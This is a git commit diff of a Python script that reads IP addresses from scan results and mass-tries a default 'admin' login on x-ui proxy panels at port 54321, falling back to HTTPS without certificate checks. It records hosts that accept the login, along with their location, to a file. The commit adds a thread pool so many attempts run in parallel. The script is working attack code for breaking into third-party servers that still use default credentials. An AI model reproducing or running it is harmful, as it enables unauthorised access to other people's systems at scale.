783896b5210af64c83054d021e54f07fa58bb21d
Aries <96482448+AriesEDGE@users.noreply.github.com>
2023-11-28 20:37:11 +0800

    Update isfuckxui.py
    多线程支持

--- isfuckxui.py
+++ isfuckxui.py
@@ -1,4 +1,5 @@
 import requests
+from concurrent.futures import ThreadPoolExecutor
 
 data = {
     'username': 'admin',
@@ -20,19 +21,28 @@ def get_ip_info(ip):
         pass
     return 'N/A'
 
-with open("results.txt", "r") as file:
-    for line in file:
-        # 提取IP地址
-        parts = line.split("Host: ")
-        if len(parts) < 2:
-            print("Invalid line format:", line)
-            continue
-        ip = parts[1].split(" ")[0]
-        url = "http://" + ip + ":54321/login"
-
+def process_ip(ip):
+    url = "http://" + ip + ":54321/login"
+    try:
+        r = requests.post(url, data=data, timeout=2)
+        if r.status_code == 200:
+            try:
+                response_data = r.json()
+                if isinstance(response_data, dict) and response_data.get("success"):
+                    ip_info = get_ip_info(ip)
+                    print(ip + ' Successful (' + ip_info + ')')
+                    with open("result.txt", "a") as result:
+                        result.write(ip + ' (' + ip_info + ')\n')
+                else:
+                    print(ip + ' Def')
+            except ValueError:
+                print("Invalid JSON response from:", url)
+        else:
+            print(ip + ' Def')
+    except requests.exceptions.RequestException:
         try:
-            # 尝试使用 HTTP 进行请求
-            r = requests.post(url, data=data, timeout=2)
+            url = "https://" + ip + ":54321/login"
+            r = requests.post(url, data=data, timeout=2, verify=False)
             if r.status_code == 200:
                 try:
                     response_data = r.json()
@@ -48,23 +58,11 @@ with open("results.txt", "r") as file:
             else:
                 print(ip + ' Def')
         except requests.exceptions.RequestException:
-            try:
-                # 使用 HTTPS 进行请求，跳过证书验证
-                url = "https://" + ip + ":54321/login"
-                r = requests.post(url, data=data, timeout=2, verify=False)
-                if r.status_code == 200:
-                    try:
-                        response_data = r.json()
-                        if isinstance(response_data, dict) and response_data.get("success"):
-                            ip_info = get_ip_info(ip)
-                            print(ip + ' Successful (' + ip_info + ')')
-                            with open("result.txt", "a") as result:
-                                result.write(ip + ' (' + ip_info + ')\n')
-                        else:
-                            print(ip + ' Def')
-                    except ValueError:
-                        print("Invalid JSON response from:", url)
-                else:
-                    print(ip + ' Def')
-            except requests.exceptions.RequestException:
-                print(ip + ' Def')
+            print(ip + ' Def')
+
+if __name__ == "__main__":
+    with open("results.txt", "r") as file:
+        ips = [line.split("Host: ")[1].split(" ")[0] for line in file if len(line.split("Host: ")) >= 2]
+
+    with ThreadPoolExecutor() as executor:
+        executor.map(process_ip, ips)
